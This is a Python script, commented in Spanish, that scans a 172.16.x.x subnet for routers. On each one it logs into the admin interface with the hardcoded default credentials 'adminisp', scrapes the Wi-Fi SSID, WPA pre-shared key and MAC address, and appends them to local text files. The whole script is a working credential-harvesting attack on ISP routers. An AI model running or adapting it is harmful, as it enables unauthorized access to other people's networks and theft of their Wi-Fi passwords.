import requests
from bs4 import BeautifulSoup

#ip = '172.16.20.5'
#ip = '192.168.101.1'
payload = {
    'username': 'adminisp',
    'psd': 'adminisp'
}

session = requests.Session()
headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5)'
           'AppleWebKit 537.36 (KHTML, like Gecko) Chrome',
           'Accept':'text/html,application/xhtml+xml,application/xml;'
           'q=0.9,image/webp,*/*;q=0.8'}

def obtenerContraseña(ip, payload, headers):

    #Login en el router
    session.post(f'http://{ip}/boaform/admin/formLogin', timeout=3, data=payload, headers=headers)

    #Consulta de SSID y Contraseña
    respuesta = session.get(f'http://{ip}/net_wlan_adv.asp', timeout=3, headers=headers)
    contenido = BeautifulSoup(respuesta.content, 'html.parser')
    info = contenido.find('form', attrs={'name': 'formEncrypt'})

    wpaSSID = info.find('option', attrs={'value':'0'}).get_text()
    wpaPSK = info.find('script').get_text()

    inicioPSK = wpaPSK.find('_wpaPSK[0]=') + len('_wpaPSK[0]=') + 1
    finPSK = wpaPSK.find('_rsPort[0]=1812') - 4

    ssid = wpaSSID[len('Root AP - '):]
    psk = wpaPSK[inicioPSK:finPSK]

    #Consulta de MAC
    respuestaMAC = session.get(f'http://{ip}/status_wlan_info_11n.asp', timeout=3, headers=headers)
    contenidoMAC = BeautifulSoup(respuestaMAC.content, 'html.parser')

    infoMAC = contenidoMAC.find('script', attrs={'language':False}).get_text()

    inicioMAC = infoMAC.find('bssid_drv[0]=') + len('bssid_drv[0]=') + 1
    finMAC = infoMAC.find('wlanDisabled[0]') - 4

    mac = infoMAC[inicioMAC:finMAC]

    print(f"ROUTER ENCONTRADO: {ip} MAC: {mac} WIFI: {ssid} CONTRASEÑA: {psk}")

    with open("RedesWIFI.txt", "a") as archivo:
        archivo.write(f"http://{ip}/ ~ {mac} ~ {ssid} ~ {psk}\n")
    with open("ContraseñasWIFI.txt", "a") as archivo:
        archivo.write(f"{psk}\n")


for net in range(7, 8):
    for host in range(1, 255):
        ip = f"172.16.{net}.{host}"
        try:
            obtenerContraseña(ip, payload, headers)
        except KeyboardInterrupt:
            break
        except:
            print(f"ROUTER NO ENCONTRADO: {ip}")
            # with open("RedesWIFI.txt", "a") as archivo:
            #     archivo.write(f"http://{ip}/ ~ No se pudo conectar ~ No se pudo conectar\n")